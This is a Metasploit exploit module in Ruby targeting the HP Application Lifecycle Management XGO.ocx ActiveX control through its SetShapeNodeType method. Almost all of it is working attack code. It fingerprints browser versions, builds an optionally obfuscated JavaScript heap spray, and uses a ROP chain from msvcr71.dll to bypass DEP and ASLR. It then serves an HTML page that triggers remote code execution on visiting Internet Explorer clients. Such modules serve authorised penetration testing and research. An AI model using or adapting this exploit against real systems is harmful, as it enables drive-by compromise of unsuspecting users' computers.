##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0",
		:ua_maxver  => "9.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:classid    => "{C3B92104-B5A7-11D0-A37F-00A0248F0AF1}",
		:method     => "SetShapeNodeType",
		:rank       => NormalRanking
	})

	def initialize(info={})
		super(update_info(info,
			'Name'           => "HP Application Lifecycle Management XGO.ocx ActiveX SetShapeNodeType() Remote Code Execution",
			'Description'    => %q{
					This module exploits a vulnerability within the XGO.ocx ActiveX Control
				installed with the HP Application Lifecycle Manager Client. The vulnerability
				exists in the SetShapeNodeType method, which allows the user to specify memory
				that will be used as an object, through the node parameter. It allows to control
				the dereference and use of a function pointer. This module has been successfully
				tested with HP Application Lifecycle Manager 11.50 and requires JRE 6 in order to
				bypass DEP and ASLR.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'rgod <rgod[at]autistici.org>', # Vulnerability discovery
					'juan vazquez'  # Metasploit
				],
			'References'     =>
				[
					[ 'OSVDB', '85152' ],
					[ 'BID', '55272' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-170/' ]
				],
			'Payload'        =>
				{
					'BadChars'        => "\x00",
					'Space'           => 890,
					'DisableNops'     => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "none",
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# XGO.xco 11.50.777.0
					[ 'Automatic', {} ],
					[ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows Vista',  { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 8 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5f4' } ],
					[ 'IE 9 on Windows 7',      { 'Rop' => :jre,    'Offset' => '0x5fe' } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Aug 29 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)
	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[1]  #IE 7 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
			return targets[2]  #IE 8 on Windows XP SP3
		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
			return targets[3]  #IE 7 on Windows Vista
		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 8/
			return targets[4]  #IE 8 on Windows Vista
		elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8/
			return targets[5]  #IE 8 on Windows 7
		elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 9/
			return targets[6]  #IE 9 on Windows 7
		else
			return nil
		end
	end

	def ie_heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
		js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

		# Land the payload at 0x0c0c0c0c
		case my_target
		when targets[6]
			# IE 9 on Windows 7
			js = %Q|
			function randomblock(blocksize)
			{
				var theblock = "";
				for (var i = 0; i < blocksize; i++)
				{
					theblock += Math.floor(Math.random()*90)+10;
				}
				return theblock;
			}

			function tounescape(block)
			{
				var blocklen = block.length;
				var unescapestr = "";
				for (var i = 0; i < blocklen-1; i=i+4)
				{
					unescapestr += "%u" + block.substring(i,i+4);
				}
				return unescapestr;
			}

			var heap_obj = new heapLib.ie(0x10000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_random_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset_length = #{my_target['Offset']};
			for (var i=0; i < 0x1000; i++) {
				var padding = unescape(tounescape(randomblock(0x1000)));
				while (padding.length < 0x1000) padding+= padding;
				var junk_offset = padding.substring(0, offset_length);
				var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
				while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
				sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
				heap_obj.alloc(sprayblock);
			}
			|

		else
			# For IE 6, 7, 8
			js = %Q|
			var heap_obj = new heapLib.ie(0x20000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset = nops.substring(0, #{my_target['Offset']});
			var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length < 0x40000) shellcode += shellcode;
			var block = shellcode.substring(0, (0x80000-6)/2);
			heap_obj.gc();
			for (var i=1; i < 0x300; i++) {
				heap_obj.alloc(block);
			}
			var overflow = nops.substring(0, 10);
			|

		end

		js = heaplib(js, {:noobfu => true})

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		return js
	end

	def get_payload(t, cli)
		# No rop
		if t['Rop'].nil?
			code = [0x0c0c0c10].pack("V")
			code << [0x0c0c0c14].pack("V")
			code << payload.encoded
			return code
		end

		code = payload.encoded

		# ROP chain generated by mona.py - See corelan.be
		exec_size = 0xffffffff - code.length + 1
		junk      = rand_text_alpha(4).unpack("V")[0].to_i

		stackpivot =
		[
			0x0c0c0c10,
			0x7c342643, # xchg eax,esp # pop edi # add byte ptr ds:[eax],al # pop ecx # retn from msvcr71.dll
			junk
		].pack("V*")

		rop =
		[
			0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
			exec_size,   # Value to negate, will become 0x00000201 (dwSize)
			0x7c347f98,  # RETN (ROP NOP)
			0x7c3415a2,  # JMP [EAX]
			0xffffffff,
			0x7c376402,  # skip 4 bytes
			0x7c351e05,  # NEG EAX # RETN
			0x7c345255,  # INC EBX # FPATAN # RETN
			0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
			0x7c344f87,  # POP EDX # RETN
			0xffffffc0,  # Value to negate, will become 0x00000040
			0x7c351eb1,  # NEG EDX # RETN
			0x7c34d201,  # POP ECX # RETN
			0x7c38b001,  # &Writable location
			0x7c347f97,  # POP EAX # RETN
			0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
			0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
			0x7c345c30,  # ptr to 'push esp #  ret '
		].pack("V*")

		code = stackpivot + rop + code
		return code
	end

	def load_exploit_html(my_target, cli)
		p  = get_payload(my_target, cli)
		js = ie_heap_spray(my_target, p)
		id_object = rand_text_alpha(5 + rand(5))

		html = %Q|
		<html>
		<head>
		<script>
		#{js}
		</script>
		</head>
		<body>
		<object classid='clsid:C3B92104-B5A7-11D0-A37F-00A0248F0AF1' id='#{id_object}'></object>
		<script language='javascript'>
			#{id_object}.SetShapeNodeType(0x0c0c0c0c, 1 , "");
		</script>
		</body>
		</html>
		|

		return html
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		my_target = get_target(agent)
		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		html = load_exploit_html(my_target, cli)
		html = html.gsub(/^\t\t/, '')
		print_status("Sending HTML...")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

end
